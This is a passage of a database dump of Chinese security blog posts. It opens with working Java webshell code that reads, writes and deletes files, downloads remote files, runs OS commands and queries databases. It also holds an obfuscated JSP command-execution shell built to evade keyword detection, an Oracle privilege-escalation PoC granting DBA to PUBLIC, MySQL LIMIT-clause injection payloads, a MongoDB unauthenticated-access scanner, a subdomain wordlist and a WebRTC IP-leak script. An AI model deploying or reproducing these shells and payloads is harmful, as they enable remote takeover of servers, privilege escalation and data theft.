deleteFiles(File f) throws Exception {\r\n        if (f.isDirectory()) {\r\n            File x[] = f.listFiles();\r\n            for (File fs : x) {\r\n                deleteFiles(fs);\r\n            }\r\n        }\r\n        f.delete();\r\n    }\r\n    byte[] readFile(String s) throws Exception {\r\n        int n;\r\n        byte[] b = new byte[1024];\r\n        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(s));\r\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\r\n        while ((n = bis.read(b)) != -1) {\r\n            bos.write(b, 0, n);\r\n        }\r\n        bis.close();\r\n        return bos.toByteArray();\r\n    }\r\n    void upload(String s, String d) throws Exception {\r\n        String h = \"0123456789ABCDEF\";\r\n        File f = new File(s);\r\n        f.createNewFile();\r\n        FileOutputStream os = new FileOutputStream(f);\r\n        for (int i = 0; i &lt; d.length(); i += 2) { os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i + 1)))); } os.close(); } void filesMove(File sf, File df) throws Exception { if (sf.isDirectory()) { if (!df.exists()) { df.mkdir(); } File z[] = sf.listFiles(); for (File z1 : z) { filesMove(new File(sf, z1.getName()), new File(df, z1.getName())); } } else { FileInputStream is = new FileInputStream(sf); FileOutputStream os = new FileOutputStream(df); int n; byte[] b = new byte[1024]; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } is.close(); os.close(); } } void fileMove(File s, File d) throws Exception { s.renameTo(d); } void mkdir(File s) throws Exception { s.mkdir(); } void setLastModified(File s, String t) throws Exception { s.setLastModified(new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").parse(t).getTime()); } void downloadRemoteFile(String s, String d) throws Exception { int n = 0; FileOutputStream os = new FileOutputStream(d); HttpURLConnection h = (HttpURLConnection) new URL(s).openConnection(); InputStream is = h.getInputStream(); byte[] b = new byte[1024]; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } os.close(); is.close(); h.disconnect(); } void inputStreamToOutPutStream(InputStream is, ByteArrayOutputStream out) throws Exception { int i = -1; byte[] b = new byte[1024]; while ((i = is.read(b)) != -1) { out.write(b, 0, i); } } void getCurrentDB(String s, ByteArrayOutputStream out) throws Exception { Connection c = getConnection(s); ResultSet r = s.contains(\"jdbc:oracle\") ? c.getMetaData().getSchemas() : c.getMetaData().getCatalogs(); while (r.next()) { out.write((r.getObject(1) + \"\\t\").getBytes(cs)); } r.close(); c.close(); } void getTableName(String s, ByteArrayOutputStream out) throws Exception { Connection c = getConnection(s); String[] x = s.trim().split(\"\\r\\n\"); ResultSet r = c.getMetaData().getTables(null, s.contains(\"jdbc:oracle\") ? x.length &gt; 5 ? x[5] : x[4] : null, \"%\", new String[]{\"TABLE\"});\r\n        while (r.next()) {\r\n            out.write((r.getObject(\"TABLE_NAME\") + \"\\t\").getBytes(cs));\r\n        }\r\n        r.close();\r\n        c.close();\r\n    }\r\n    void getTableColumn(String s, ByteArrayOutputStream out) throws Exception {\r\n        String[] x = s.trim().split(\"\\r\\n\");\r\n        Connection c = getConnection(s);\r\n        ResultSet r = c.prepareStatement(\"select * from \" + x[x.length - 1]).executeQuery();\r\n        ResultSetMetaData d = r.getMetaData();\r\n        for (int i = 1; i &lt;= d.getColumnCount(); i++) { out.write((d.getColumnName(i) + \" (\" + d.getColumnTypeName(i) + \")\\t\").getBytes(cs)); } r.close(); c.close(); } void executeQuery(String cs, String s, String q, ByteArrayOutputStream out, String p) throws Exception { Connection c = getConnection(s); Statement m = c.createStatement(1005, 1008); BufferedWriter bw = null; try { boolean f = q.contains(\"--f:\"); ResultSet r = m.executeQuery(f ? q.substring(0, q.indexOf(\"--f:\")) : q); ResultSetMetaData d = r.getMetaData(); int n = d.getColumnCount(); for (int i = 1; i &lt;= n; i++) { out.write((d.getColumnName(i) + \"\\t|\\t\").getBytes(cs)); } out.write((\"\\r\\n\").getBytes(cs)); if (f) { File file = new File(p); if (!q.contains(\"-to:\")) { file.mkdir(); } bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.contains(\"-to:\") ? p.trim() : p + q.substring(q.indexOf(\"--f:\") + 4, q.length()).trim()), true), cs)); } while (r.next()) { for (int i = 1; i &lt;= n; i++) { if (f) { bw.write(r.getObject(i) + \"\" + \"\\t\"); bw.flush(); } else { out.write((r.getObject(i) + \"\" + \"\\t|\\t\").getBytes(cs)); } } if (bw != null) { bw.newLine(); } out.write((\"\\r\\n\").getBytes(cs)); } r.close(); if (bw != null) { bw.close(); } } catch (Exception e) { out.write((\"Result\\t|\\t\\r\\n\").getBytes(cs)); try { m.executeUpdate(q); out.write((\"Execute Successfully!\\t|\\t\\r\\n\").getBytes(cs)); } catch (Exception ee) { out.write((ee.toString() + \"\\t|\\t\\r\\n\").getBytes(cs)); } } m.close(); c.close(); } public String doPost(Map<string,string>request) throws IOException {\r\n        cs = request.get(\"z0\") != null ? request.get(\"z0\") + \"\" : cs;\r\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\r\n        try {\r\n            char z = (char) request.get(getPassword()).getBytes()[0];\r\n            String z1 = encoding(request.get(\"z1\") + \"\");\r\n            String z2 = encoding(request.get(\"z2\") + \"\");\r\n            out.write(\"-&gt;|\".getBytes(cs));\r\n            String s = new File(\"\").getCanonicalPath();\r\n            byte[] returnTrue = \"1\".getBytes(cs);\r\n            switch (z) {\r\n                case \'A\':\r\n                    out.write((s + \"\\t\").getBytes(cs));\r\n                    if (!s.substring(0, 1).equals(\"/\")) {\r\n                        listRoots(out);\r\n                    }\r\n                    break;\r\n                case \'B\':\r\n                    dir(z1, out);\r\n                    break;\r\n                case \'C\':\r\n                    String l = \"\";\r\n                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));\r\n                    while ((l = br.readLine()) != null) {\r\n                        out.write((l + \"\\r\\n\").getBytes(cs));\r\n                    }\r\n                    br.close();\r\n                    break;\r\n                case \'D\':\r\n                    BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));\r\n                    bw.write(z2);\r\n                    bw.flush();\r\n                    bw.close();\r\n                    out.write(returnTrue);\r\n                    break;\r\n                case \'E\':\r\n                    deleteFiles(new File(z1));\r\n                    out.write(\"1\".getBytes(cs));\r\n                    break;\r\n                case \'F\':\r\n                    out.write(readFile(z1));\r\n                case \'G\':\r\n                    upload(z1, z2);\r\n                    out.write(returnTrue);\r\n                    break;\r\n                case \'H\':\r\n                    filesMove(new File(z1), new File(z2));\r\n                    out.write(returnTrue);\r\n                    break;\r\n                case \'I\':\r\n                    fileMove(new File(z1), new File(z2));\r\n                    out.write(returnTrue);\r\n                    break;\r\n                case \'J\':\r\n                    mkdir(new File(z1));\r\n                    out.write(returnTrue);\r\n                    break;\r\n                case \'K\':\r\n                    setLastModified(new File(z1), z2);\r\n                    out.write(returnTrue);\r\n                    break;\r\n                case \'L\':\r\n                    downloadRemoteFile(z1, z2);\r\n                    out.write(returnTrue);\r\n                    break;\r\n                case \'M\':\r\n                    String[] c = {z1.substring(2), z1.substring(0, 2), z2};\r\n                    Process p = Runtime.getRuntime().exec(c);\r\n                    inputStreamToOutPutStream(p.getInputStream(), out);\r\n                    inputStreamToOutPutStream(p.getErrorStream(), out);\r\n                    break;\r\n                case \'N\':\r\n                    getCurrentDB(z1, out);\r\n                    break;\r\n                case \'O\':\r\n                    getTableName(z1, out);\r\n                    break;\r\n                case \'P\':\r\n                    getTableColumn(z1, out);\r\n                    break;\r\n                case \'Q\':\r\n                    executeQuery(cs, z1, z2, out, z2.contains(\"-to:\") ? z2.substring(z2.indexOf(\"-to:\") + 4, z2.length()) : s.replaceAll(\"\\\\\\\\\", \"/\") + \"images/\");\r\n                    break;\r\n            }\r\n        } catch (Exception e) {\r\n            out.write((\"ERROR\" + \":// \" + e.toString()).getBytes(cs));\r\n        }\r\n        out.write((\"|&lt;-\").getBytes(cs)); return new String(out.toByteArray()); } }</string,string></pre>\r\n<p>\r\n	map.txt:\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">oracle.jdbc.driver.OracleDriver=http://javaweb.org/jdbc/classes12.jar\r\ncom.mysql.jdbc.Driver=http://javaweb.org/jdbc/mysql-connector-java-5.1.14-bin.jar\r\ncom.microsoft.jdbc.sqlserver.SQLServerDriver=http://javaweb.org/jdbc/sqlserver2000/msbase.jar,http://javaweb.org/jdbc/sqlserver2000/mssqlserver.jar,http://javaweb.org/jdbc/sqlserver2000/msutil.jar\r\ncom.microsoft.sqlserver.jdbc.SQLServerDriver=http://javaweb.org/jdbc/sqljdbc4.jar\r\ncom.ibm.db2.jcc.DB2Driver=http://javaweb.org/jdbc/db2java.jar\r\ncom.informix.jdbc.IfxDriver=http://javaweb.org/jdbc/ifxjdbc.jar\r\ncom.sybase.jdbc3.jdbc.SybDriver=http://javaweb.org/jdbc/jconn3d.jar\r\norg.postgresql.Driver=http://javaweb.org/jdbc/postgresql-9.2-1003.jdbc4.jar\r\ncom.ncr.teradata.TeraDriver=http://javaweb.org/jdbc/teradata-jdbc4-14.00.00.04.jar\r\ncom.hxtt.sql.access.AccessDriver=http://javaweb.org/jdbc/Access_JDBC30.jar\r\norg.apache.derby.jdbc.ClientDriver=http://javaweb.org/jdbc/derby.jar\r\norg.hsqldb.jdbcDriver=http://javaweb.org/jdbc/hsqldb.jar\r\nnet.sourceforge.jtds.jdbc.Driver=http://javaweb.org/jdbc/jtds-1.2.5.jar\r\nmongodb=http://javaweb.org/jdbc/mongo-java-driver-2.9.3.jar</pre>\r\n<p>\r\n	无任何命令执行关键字的<a class=\"ke-insertfile\" href=\"/uploads/file/20180502/20180502014842_62.zip\" target=\"_blank\">cmd.zip</a>\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">&lt;jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"&gt;\r\n    &lt;jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\"/&gt;\r\n    &lt;jsp:scriptlet&gt;\r\n        Class&amp;lt;?&amp;gt; api = String.class.getClass().forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));\r\n        Object obj2 = api.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class).invoke(api.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{request.getParameter(&amp;quot;str&amp;quot;)});\r\n        java.lang.reflect.Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));\r\n        m.setAccessible(true);\r\n        java.util.Scanner s = new java.util.Scanner((java.io.InputStream) m.invoke(obj2, new Object[]{})).useDelimiter(&amp;quot;\\\\A&amp;quot;);\r\n        out.write(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot; + (s.hasNext() ? s.next() : &amp;quot;&amp;quot;) + &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);\r\n    &lt;/jsp:scriptlet&gt;\r\n&lt;/jsp:root&gt;</pre>\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">\r\n</pre>', null, '2014-12-17 17:26:14', '1', '1757', null, '9', '2015-10-02 16:29:16'), ('1637', '1', '14', 'Mongodb未授权访问', '园长', 'Mongodb默认不需要配置auth导致未授权访问问题令人堪忧。\n<p>前年的时候写了个Mongodb未授权扫描工具发现了一些企业Mongodb未授权访问问题(测试发现包括一些游戏厂商)，但在数量上还不太严重。</p>\n<p>近期Mongodb问题越演越烈，上周对10812个国内IP进行探测时候发现了接近4000个未授权访问IP。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/12/12.jpg\"><img class=\"alignnone size-full wp-image-1640\" src=\"http://javaweb.org/wp-content/uploads/2014/12/12.jpg\" alt=\"1\" width=\"479\" height=\"823\" /></a></p>\n<p>漏洞验证方法：</p>\n<p>利用mongo-java-driver-2.12.4.jar</p>\n<pre class=\"brush: java; gutter: true\">MongoClient client = new MongoClient(host,port);</pre>\n或:\n<pre class=\"brush: java; gutter: true\">private boolean loginTest(String host,int timeout){ \n    try { \n      byte[] b = new byte[]{0x3f,0x00,0x00,0x00,(byte) 0x97,0x75,(byte) 0xbc,0x60,(byte) 0xff,(byte) 0xff,(byte) 0xff,(byte) 0xff,(byte) 0xd4,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x61,0x64,0x6d,0x69,0x6e,0x2e,0x24,0x63,0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x18,0x00,0x00,0x00,0x10,0x6c,0x69,0x73,0x74,0x44,0x61,0x74,0x61,0x62,0x61,0x73,0x65,0x73,0x00,0x01,0x00,0x00,0x00,0x00}; \n      InetSocketAddress address = new InetSocketAddress(host,27017); \n      Socket socket = new Socket(); \n      socket.connect(address,timeout); \n      socket.setSoTimeout(timeout); \n      OutputStream out = socket.getOutputStream(); \n      out.write(b); \n      socket.shutdownOutput(); \n      BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream())); \n      String str = &quot;&quot;; \n      StringBuilder sb = new StringBuilder(); \n      while((str=br.readLine())!=null){ \n        sb.append(str); \n      } \n      return sb.toString().contains(&quot;local&quot;); \n    } catch (Exception e) { \n      return false; \n    } \n  }</pre>\n<p>这里似乎有一份邪红色团队的“全球Mongodb未授权访问探测报告\"同样说明了问题的严重性：</p>\n<p><a href=\"https://github.com/ff0000team/HackerSoul/blob/master/paper/mongodb_unauthorized_access_vulnerability_global_probing_report.pdf\" target=\"_blank\">Mongodb unauthorized access vulnerability global probing report</a></p>\n<pre class=\"brush: java; gutter: true\">[+] Author: f1,2,4 \n[+] Team: FF0000 TEAM &lt;http://www.ff0000.cc&gt; \n[+] From: HackerSoul &lt;http://www.hackersoul.com&gt; \n[+] Create: 2014-12-10 \nIntroduction \nDomain list \nProof of Concept \nScan results \nIP location \nEvil hackers</pre>', null, '2014-12-21 23:55:56', '1', '722', null, '0', '2014-12-22 00:04:49'), ('1643', '1', '10', '子域名Top 3000', '园长', '<pre class=\"brush: rails; gutter: true\">mysql&gt; select SUBSTR(domain,1,LOCATE(&#039;.&#039;,domain)-1) pre,count(*) c from sys_domain where parent_id &gt; 0 group by pre order by c desc limit 0,3000;\n+----------------+---------+\n| pre            | c       |\n+----------------+---------+\n| www            | 1024282 |\n| mail           |  451476 |\n| ftp            |  187225 |\n| smtp           |  169424 |\n| pop            |  140343 |\n| m              |   79738 |\n| webmail        |   76103 |\n| pop3           |   56713 |\n| imap           |   45873 |\n| localhost      |   44444 |\n| autodiscover   |   39349 |\n| admin          |   34667 |\n| bbs            |   33637 |\n| test           |   33279 |\n| mx             |   29939 |\n| en             |   29384 |\n| email          |   28887 |\n| wap            |   27455 |\n| blog           |   25578 |\n| oa             |   25277 |\n| ns1            |   22630 |\n| vpn            |   22311 |\n| ns2            |   22140 |\n| www2           |   21640 |\n| mysql          |   21575 |\n| webdisk        |   19663 |\n| dev            |   18736 |\n| old            |   17895 |\n| news           |   17740 |\n| calendar       |   16481 |\n| shop           |   16124 |\n| potala         |   15975 |\n| mobile         |   15588 |\n| web            |   15569 |\n| sip            |   15567 |\n| mobilemail     |   15445 |\n..........</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/01/domain.txt\">domain.txt</a></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/06/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BC%80top3000.txt\">子域名前缀top3000-新</a></p>', null, '2015-01-03 12:28:28', '1', '803', null, '3', '2015-06-24 11:49:21'), ('1655', '1', '3', 'java应用内存dump和分析工具', '园长', '首先：# ps -ef |grep java 找到程序的PID，然后用jmap dump分析。\n<p># jmap -dump:format=b,file=test.bin 23160</p>\n<p>压缩后下载到本地。</p>\n<p># zip -r test.bin.zip test.bin</p>\n<p>本机解压后使用jat查看：</p>\n<p>[yz@yz:Downloads]$ jhat test.bin</p>\n<p>Reading from test.bin...</p>\n<p>Dump file created Mon Jan 19 18:06:51 CST 2015</p>\n<p>Snapshot read, resolving...</p>\n<p>Resolving 1602637 objects...</p>\n<p>Chasing references, expect 320 dots................................................................................................................................................................................................................................................................................................................................</p>\n<p>Eliminating duplicate references................................................................................................................................................................................................................................................................................................................................</p>\n<p>Snapshot resolved.</p>\n<p>Started HTTP server on port 7000</p>\n<p>Server is ready.</p>\n<code><span class=\"typ\"> 访问：http://localhost:7000/ 分析 或者下载eclipse的MemoryAnalyzer分析。</span></code>', null, '2015-01-19 22:57:14', '1', '716', null, '0', '2015-05-13 10:39:56'), ('1660', '1', '3', 'Oracle public权限用户通过Oracle索引提权', '园长', '今天下午2点左右看到这个漏洞就立马测试了一下发现没成功(我测试的版本是12.1.0.1.0 和oracle 10g)，google了一下找到了<a href=\"http://www.oracleforensics.com/wordpress/index.php/2014/03/27/index-to-sysdba-without-select/\" target=\"_blank\">INDEX to SYSDBA without SELECT</a>。\n<p>文章发布时间是2014年3月，当时觉得可能是一个老漏洞了(我那时还不知道这个漏洞的CVE)。到了下午看到相关的漏洞新闻报道才知道Oracle 漏洞猎手David Litchfield在去年6又发现了一个新提权漏洞(CVE-2015-0393)。</p>\n<p>引用一篇关于这个漏洞的报道：</p>\n<pre class=\"brush: java; gutter: true\">疑似后门：漏洞CVE-2015-0393 \n江湖人称“Oracle漏洞猎手”的David Litchfield在去年6月11日发现过Oracle一个疑似后门的严重漏洞CVE-2015-0393。 \n日前Litchfield向我们透漏了一些漏洞细节： \n在该漏洞中，Oracle数据库内的PUBLIC角色在DUAL表中被授予了索引权限，也就是说任何用户都可以在该表创建索引。 \nDUAL表是SYS用户下的一张内部表，所有用户都可以使用DUAL名称访问，无论什么时候这个表总是存在。在DUAL表中创建了基于函数的索引后，黑客将暂时获得SYS用户权限(SYSDBA)，可执行任意SQL语句进而尝试控制整个服务器。如果存在这个漏洞的电子商务套件可以从外网远程访问的话，攻击者只要有PUBLIC角色(不需要用户密码)，就可以跟进后续一大波的漏洞攻击。 \nLitchfield觉得PUBLIC角色是不应该拥有DUAL表的索引权限，据此他判断出这个漏洞可能是由于代码编写出现的bug或者是开发人员刻意留下的后门。 \n漏洞进展 \n在一次给客户进行安全检测的过程中，Litchfield发现了这个漏洞。 \n由于该漏洞可以直接获得SYSDBA权限，他最开始以为这是某人留的后门，但后来与客户交流后，客户的技术人员开始调查该“后门”事件，最后发现该权限授予漏洞是在Oracle电子商务套件安装时就有的。 \nLitchfield承认从Oracle得知，官方技术人员检查了该漏洞，但却表示并没有找到该权限授予漏洞出现的时间和漏洞成因。Oracle在严重补丁升级时表示，这个漏洞并非远程执行。Oracle给其评级为6分(满分10分)。 \nOracle官方表示，当前漏洞已经被修复。 \n其他重要补丁升级情况 \n在Java平台上，Oracle为19个漏洞打了补丁，其中有14个漏洞可以远程利用，包括部分严重级别很高的漏洞。然而，Oracle表示Java漏洞的数量会呈递减趋势，这是由历史数据验证过的。 \n同时，Oracle还修补了八个最重要的Oracle数据服务器的漏洞，其中没有远程利用的漏洞，也没有在客户端利用的。其中唯一的高危漏洞，是Oracle Sun Systems的Fujitsu M10-1, M10-4 and M10-4S servers。</pre>\n<p>刚才把版本更新到了11.2.0.2.0测了文章中谈到的提权(<a href=\"http://www.oracleforensics.com/wordpress/index.php/2014/03/27/index-to-sysdba-without-select/\" target=\"_blank\">INDEX to SYSDBA without SELECT</a>，测试的不是CVE-2015-0393 我现在还没环境)</p>\n<p>测试如下：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/01/1.png\"><img class=\"alignnone size-full wp-image-1661\" src=\"http://javaweb.org/wp-content/uploads/2015/01/1.png\" alt=\"1\" width=\"668\" height=\"842\" /></a></p>\n<p>Oracle官方发布的受CVE-2015-0393影响版本：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/01/2.jpg\"><img class=\"alignnone size-full wp-image-1662\" src=\"http://javaweb.org/wp-content/uploads/2015/01/2.jpg\" alt=\"2\" width=\"895\" height=\"88\" /></a></p>\n<p>好忧伤又得升级一次版本，不过这里先给出CVE-2015-0393的POC：</p>\n<pre class=\"brush: sql; gutter: true\">SQL&gt; connect tss/password \nConnected. \nSQL&gt; set role dba; \nset role dba \n* \nERROR at line 1: \nORA-01924: role &#039;DBA&#039; not granted or does not exist \nSQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO VARCHAR) RETURN VARCHAR DETERMINISTIC AUTHID \nCURRENT_USER IS \n  PRAGMA AUTONOMOUS_TRANSACTION; \n  BEGIN \n  EXECUTE IMMEDIATE &#039;GRANT DBA TO PUBLIC&#039;; \n  COMMIT; \n  RETURN &#039;FOO&#039;; \n  END; \n  / \nFunction created. \nSQL&gt; GRANT EXECUTE ON GETDBA TO PUBLIC; \nGrant succeeded. \nSQL&gt; \nSQL&gt; CREATE INDEX EXPLOIT_INDEX ON SYS.FOO(TSS.GETDBA(BAR)); \nIndex created. \nSQL&gt; select * from sys.foo; \nB \n- \nX \nSQL&gt; set role dba;</pre>\n<p>附： <a href=\"https://www.youtube.com/watch?v=z0ccYgcBSGg\" target=\"_blank\">Black Hat USA 2012 - Find Me in Your Database: An Examination of Index Security</a></p>', null, '2015-01-23 20:06:33', '1', '896', null, '0', '2015-01-24 15:08:25'), ('1665', '5', '14', '[zone]MySQL 在 LIMIT 条件后注入', 'Anonymous', 'FROM：<a href=\"http://zone.wooyun.org/content/18220\">http://zone.wooyun.org/content/18220</a>\n<p>from:<a href=\"https://rateip.com/blog/sql-injections-in-mysql-limit-clause/\" target=\"_blank\">https://rateip.com/blog/sql-injections-in-mysql-limit-clause/</a></p>\n<p>此方法适用于MySQL 5.x中，在limit语句后面的注入</p>\n<p>例如：</p>\n<pre class=\"brush: sql; gutter: true\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT injection_point</pre>\n上面的语句包含了ORDER BY，MySQL当中UNION语句不能在ORDER BY的后面，否则利用UNION很容易就可以读取数据了，看看在MySQL 5中的SELECT语法：\n<pre class=\"brush: sql; gutter: true\">SELECT \n    [ALL | DISTINCT | DISTINCTROW ] \n      [HIGH_PRIORITY] \n      [STRAIGHT_JOIN] \n      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] \n      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] \n    select_expr [, select_expr ...] \n    [FROM table_references \n    [WHERE where_condition] \n    [GROUP BY {col_name | expr | position} \n      [ASC | DESC], ... [WITH ROLLUP]] \n    [HAVING where_condition] \n    [ORDER BY {col_name | expr | position} \n      [ASC | DESC], ...] \n    [LIMIT {[offset,] row_count | row_count OFFSET offset}] \n    [PROCEDURE procedure_name(argument_list)] \n    [INTO OUTFILE &#039;file_name&#039; export_options \n      | INTO DUMPFILE &#039;file_name&#039; \n      | INTO var_name [, var_name]] \n    [FOR UPDATE | LOCK IN SHARE MODE]]</pre>\n<p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用PROCEDURE函数能否注入呢？</p>\n<p>Let’s give it a try:</p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); \nERROR 1386 (HY000): Can&#039;t use ORDER clause with this procedure</pre>\n<p>ANALYSE可以有两个参数：</p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1);\nERROR 1386 (HY000): Can&#039;t use ORDER clause with this procedure</pre>\n<p>看起来并不是很好，继续尝试：</p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT field from table where id &gt; 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);</pre>\n但是立即返回了一个错误信息：\n<pre class=\"brush: sql; gutter: true\">ERROR 1108 (HY000): Incorrect parameters to procedure &#039;analyse&#039;</pre>\nsleep函数肯定没有执行，但是最终我还是找到了可以攻击的方式：\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); \nERROR 1105 (HY000): XPATH syntax error: &#039;:5.5.41-0ubuntu0.14.04.1&#039;</pre>\n<p>如果不支持报错注入的话，还可以基于时间注入：</p>\n<pre class=\"brush: sql; gutter: true\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</pre>\n直接使用sleep不行，需要用BENCHMARK代替。\nPS：测试成功，无图无真相：\n<a href=\"http://javaweb.org/wp-content/uploads/2015/01/1.jpg\"><img class=\"alignnone size-full wp-image-1666\" src=\"http://javaweb.org/wp-content/uploads/2015/01/1.jpg\" alt=\"1\" width=\"1470\" height=\"78\" /></a>', null, '2015-01-24 22:41:33', '1', '756', null, '2', '2015-01-24 22:42:02'), ('1668', '1', '31', 'Struts2 Security Bulletins 备份', '园长', '<a href=\"http://javaweb.org/Struts2/s2-001.html\">S2-001</a>\n<p><a href=\"http://javaweb.org/Struts2/s2-002.html\">S2-002</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-003.html\">S2-003</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-004.html\">S2-004</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-005.html\">S2-005</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-006.html\">S2-006</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-007.html\">S2-007</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-008.html\">S2-008</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-009.html\">S2-009</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-010.html\">S2-010</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-011.html\">S2-011</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-012.html\">S2-012</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-013.html\">S2-013</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-014.html\">S2-014</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-015.html\">S2-015</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-016.html\">S2-016</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-017.html\">S2-017</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-018.html\">S2-018</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-019.html\">S2-019</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-020.html\">S2-020</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-021.html\">S2-021</a></p>\n<p><a href=\"http://javaweb.org/Struts2/s2-022.html\">S2-022</a></p>', null, '2014-12-26 11:23:42', '1', '741', null, '0', '2015-01-26 11:55:47'), ('1672', '1', '13', '[zone] JavaScript 获取客户端内网IP和外网IP(STUN)', '园长', 'FROM:<a href=\"http://zone.wooyun.org/content/18274\">http://zone.wooyun.org/content/18274</a>\n<p>from:https://github.com/diafygi/webrtc-ips</p>\n<p>Firefox 跟 Chrome支持WebRTC可以向STUN服务器请求，返回内外网IP，不同于XMLHttpRequest请求，STUN请求开发者工具当中看不到网络请求的。</p>\n<p><a href=\"http://javaweb.org/tools/ip.html\">测试链接</a></p>\n<pre class=\"brush: javascript; gutter: true\">//get the IP addresses associated with an account\nfunction getIPs(callback){\n    var ip_dups = {};\n    //compatibility for firefox and chrome\n    var RTCPeerConnection = window.RTCPeerConnection\n        || window.mozRTCPeerConnection\n        || window.webkitRTCPeerConnection;\n    var mediaConstraints = {\n        optional: [{RtpDataChannels: true}]\n    };\n    //firefox already has a default stun server in about:config\n    //    media.peerconnection.default_iceservers =\n    //    [{&quot;url&quot;: &quot;stun:stun.services.mozilla.com&quot;}]\n    var servers = undefined;\n    //add same stun server for chrome\n    if(window.webkitRTCPeerConnection)\n        servers = {iceServers: [{urls: &quot;stun:stun.services.mozilla.com&quot;}]};\n    //construct a new RTCPeerConnection\n    var pc = new RTCPeerConnection(servers, mediaConstraints);\n    //listen for candidate events\n    pc.onicecandidate = function(ice){\n        //skip non-candidate events\n        if(ice.candidate){\n            //match just the IP address\n            var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/\n            var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];\n            //remove duplicates\n            if(ip_dups[ip_addr] === undefined)\n                callback(ip_addr);\n            ip_dups[ip_addr] = true;\n        }\n    };\n    //create a bogus data channel\n    pc.createDataChannel(&quot;&quot;);\n    //create an offer sdp\n    pc.createOffer(function(result){\n        //trigger the stun server request\n        pc.setLocalDescription(result, function(){});\n    }, function(){});\n}\n//Test: Print the IP addresses into the console\ngetIPs(function(ip){console.log(ip);});</pre>', null, '2015-01-27 11:32:49', '1', '1143', null, '2', '2015-01-27 11:37:01'), ('1675', '1', '3', 'jsoup 1.8 修改版', '园长', '简单修改了几个小地方：\n<p>1、增加了自定义URL参数Encoding(connection.setURLEncoding(boolean isURLEncoding);)。</p>\n<p>2、增加动态识别网页源码方法,原来的获取页面编码会不太准确，现在如果设置了自动parseEncoding的可以降低乱码出现率(connection.setParseEncoding(boolean parseEncoding);)。</p>\n<p>3、增加了一个基础工具类用来发简单的HTTP请求(org.jsoup.helper.HttpRequestUtils)。</p>\n<p>4、新增了忽略SSL证书方法(org.jsoup.helper.SslUtils)</p>\n<p>编译环境jdk1.5</p>\n<p><a 